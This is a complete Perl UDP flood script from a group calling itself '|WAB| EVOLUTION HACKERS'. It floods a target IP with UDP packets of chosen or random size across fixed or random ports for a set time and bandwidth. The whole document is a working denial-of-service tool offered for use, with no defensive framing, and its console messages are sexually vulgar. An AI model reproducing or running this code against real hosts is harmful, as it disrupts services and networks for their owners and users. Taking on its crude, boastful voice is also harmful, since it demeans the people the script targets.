#!/usr/bin/perl
#####################################################
#            |WAB| UDP FLOOD SCRIPT v2.0            #
#####################################################
#                                                   #
#               *                   *               #
#             **                     **             #
#            ***                     ***            #
#           *****                   *****           #
#           ************     ************           #
#           ***** ******** ******** *****         	#
#           **** ******************* ****           #
#           **** ***  * ***** *  *** ****           #
#            ***  *      ***      *  ***            #
#             ***         *         ***             #
#              **                   **              #
#               *                   *               #
#                                                   #
#####################################################
#     (c) Copyright 2019 |WAB| EVOLUTION HACKERS    #
#####################################################
use Socket;
use strict;
use Getopt::Long;
use Time::HiRes qw( usleep gettimeofday ) ;
use Term::ANSIColor;
our $port = 0;
our $size = 0;
our $time = 0;
our $bw   = 0;
our $help = 0;
our $delay= 0;
GetOptions(
	"p=i" => \$port,
	"s=i" => \$size,
	"b=i" => \$bw,
	"t=i" => \$time,
	"d=f"=> \$delay,
	"help|?" => \$help);
my ($ip) = @ARGV;
my ($logo) = '
                *                   *
              **                     **
             ***                     ***
            *****                   *****
            ************     ************
            ***** ******** ******** *****
            **** ******************* ****
            **** ***  * ***** *  *** ****
             ***  *      ***      *  ***
              ***         *         ***
               **                   **
                *                   *
        ____________________________________
';
if ($help || !$ip) {
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print color('reset'),"$logo\n   ";
print color('bold red'),"[";
print color('reset'),"*";
print color('bold red'),"] ";
print color("reset"),"Options:\n      ";
print color('bold red'),"-p ";
print color('reset'),"- ";
print color('bold black'),"UDP port to use, number (0 = random)\n      ";
print color('bold red'),"-s ";
print color('reset'),"- ";
print color('bold black'),"Packet size, number (0 = random)\n      ";
print color('bold red'),"-b ";
print color('reset'),"- ";
print color('bold black'),"Bandwidth to consume\n      ";
print color('bold red'),"-t ";
print color('reset'),"- ";
print color('bold black'),"Time to run\n      ";
print color('bold red'),"-d ";
print color('reset'),"- ";
print color('bold black'),"Inter-packet delay\n\n   ";
print color('bold red'),"[";
print color('reset'),"?";
print color('bold red'),"] ";
print color("reset"),"How to use:\n   ";;
print color("reset"),"<script.pl> <ip address> <option> <number>\n";;
  exit(1);
}
if ($bw && $delay) {
  print "WARNING: computed packet size overwrites the --size parameter ignored\n";
  $size = int($bw * $delay / 8);
} elsif ($bw) {
  $delay = (8 * $size) / $bw;
}
$size = 256 if $bw && !$size;
($bw = int($size / $delay * 8)) if ($delay && $size);
my ($iaddr,$endtime,$psize,$pport);
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
$iaddr = inet_aton("$ip") or die print color('reset'),"$logo
      Oh bro i can't connect with that pussy :(
\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print color('reset'),"$logo";
print color('reset'), "\n   IM FUCKING ";
print color('red'), "$ip ";
print color('reset'), "IN ANAL WITH";
print color('red'), "" . ($port ? " PORT $port" : " RANDOM PORT") . "\n";
print color('reset'), "   AND ";
print color('red'), "" . ($size ? "$size" : "20") . "";
print color('reset'), " CM SIZE OF DICK";
print color('red'), "" . ($time ? " FOR $time SECONDS" : "") . "\n";
print color('reset'), "";
die "Invalid packet size requested: $size\n" if $size && ($size < 64 || $size > 1500);
$size -= 28 if $size;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
  usleep(1000 * $delay) if $delay;
}